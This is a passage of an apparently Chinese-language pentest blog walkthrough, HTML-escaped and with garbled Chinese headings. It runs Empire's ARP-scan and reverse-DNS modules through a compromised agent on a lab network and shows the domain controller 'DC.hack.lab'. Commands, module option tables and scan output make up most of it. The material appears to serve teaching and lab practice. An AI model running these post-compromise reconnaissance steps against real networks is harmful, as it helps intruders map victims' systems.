&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Author       DarkOperator                                                     
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Background   True                                                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Comments     https://github.com/darkoperator/Posh-                            
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              SecMod/blob/master/Discovery/Discovery.psm1                      
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Description  Performs an ARP scan against a given range of IPv4 IP Addresses. 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Language     powershell                                                       
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name         powershell/situational_awareness/network/arpscan                 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; NeedsAdmin   False                                                            
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; OpsecSafe    True                                                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Software     http://attack.mitre.org/software/S0099                           
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Techniques   http://attack.mitre.org/techniques/T1016                         
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”ŒRecord Optionsâ”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Name           â”‚ Value      â”‚ Required â”‚ Description                         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Agent          â”‚ Y35E4PR8   â”‚ True     â”‚ Agent to run module on.             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ CIDR           â”‚            â”‚ False    â”‚ CIDR to ARP scan.                   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ OutputFunction â”‚ Out-String â”‚ False    â”‚ PowerShell&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s output &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; to use â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                â”‚            â”‚          â”‚ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Out-String&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Json&amp;#34;&lt;/span&gt;,    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                â”‚            â”‚          â”‚ &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Csv&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Html&amp;#34;&lt;/span&gt;,  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                â”‚            â”‚          â”‚ &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Xml&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Range          â”‚            â”‚ False    â”‚ Range to ARP scan.                  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/situational_awareness/network/arpscan&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; CIDR 172.16.0.1/24
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set CIDR to 172.16.0.1/24
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/situational_awareness/network/arpscan&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked Y35E4PR8 to run Task &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Job started: 61X5W8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MAC               Address     
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;---               -------     
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;F3:B8:9A:2D:5F:D3 172.16.0.101
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;13:7D:DA:AA:AB:E9 172.16.0.102
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;23:CD:C4:85:7C:5D 172.16.0.104
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;03:0C:29:AD:5B:F3 172.16.0.105
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;03:0C:29:7B:D6:46 172.16.0.106
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;13:7D:DA:AA:AB:E9 172.16.0.107
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;03:0C:29:7B:D6:46 172.16.0.255
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;dnsä¿¡æ¯è·å–&#34;&gt;DNSä¿¡æ¯è·å–&lt;/h3&gt;
&lt;p&gt;æˆ‘ä»¬çŸ¥é“æœºå™¨ä¸­IPå¯¹åº”å’Œhostnameå¯ä»¥æœ‰æ•ˆåˆ†æå†…ç½‘çš„ç»“æ„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: Y35E4PR8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; usemodule powershell/situational_awareness/network/reverse_dns
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Agent to Y35E4PR8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Author       DarkOperator                                            
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Background   True                                                    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Comments     https://github.com/darkoperator/Posh-                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              SecMod/blob/master/Discovery/Discovery.psm1             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Description  Performs a DNS Reverse Lookup of a given IPv4 IP Range. 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Language     powershell                                              
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name         powershell/situational_awareness/network/reverse_dns    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; NeedsAdmin   False                                                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; OpsecSafe    True                                                    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Techniques   http://attack.mitre.org/techniques/T1046                
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”ŒRecord Optionsâ”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Name           â”‚ Value      â”‚ Required â”‚ Description                         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Agent          â”‚ Y35E4PR8   â”‚ True     â”‚ Agent to run module on.             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ CIDR           â”‚            â”‚ False    â”‚ CIDR to perform reverse DNS on.     â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ OutputFunction â”‚ Out-String â”‚ False    â”‚ PowerShell&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s output &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; to use â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                â”‚            â”‚          â”‚ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Out-String&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Json&amp;#34;&lt;/span&gt;,    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                â”‚            â”‚          â”‚ &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Csv&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Html&amp;#34;&lt;/span&gt;,  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                â”‚            â”‚          â”‚ &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Xml&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Range          â”‚            â”‚ False    â”‚ Range to perform reverse DNS on.    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/situational_awareness/network/reverse_dns&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; CIDR
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;list assignment index out of range
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/situational_awareness/network/reverse_dns&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; CIDR 172.16.0.1/24
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set CIDR to 172.16.0.1/24
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/situational_awareness/network/reverse_dns&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HostName        AddressList                                 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--------        -----------                                                                                                     
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;DC.hack.lab     &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;172.16.0.106&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;è·å–åŸŸæ§åˆ¶å™¨&#34;&gt;è·å–åŸŸæ§åˆ¶å™¨&lt;/h3&gt;
&lt;p&gt;ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤å¯ä»¥è·å–åˆ°åŸŸæ§æ‰€åœ¨çš„ä½ç½®ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: Y35E4PR8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; usemodule powershell/situational_awareness/network/reverse_dns
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Agent to Y35E4PR8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Author       DarkOperator                                            
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Background   True                                                    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Comments     https://github.com/darkoperator/Posh-                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              SecMod/blob/master/Discovery/Discovery.psm1             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Description  Performs a DNS Reverse Lookup of a given IPv4 IP Range. 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Language     powershell                                              
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name         powershell/situational_awareness/network/reverse_dns    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; NeedsAdmin   False                                                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; OpsecSafe    True                                                    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Techniques   http://attack.mitre.org/techniques/T1046                
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”ŒRecord Optionsâ”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Name           â”‚ Value      â”‚ Required â”‚ Description                         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Agent          â”‚ Y35E4PR8   â”‚ True     â”‚ Agent to run module on.             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ CIDR           â”‚            â”‚ False    â”‚ CIDR to perform reverse DNS on.     â”‚
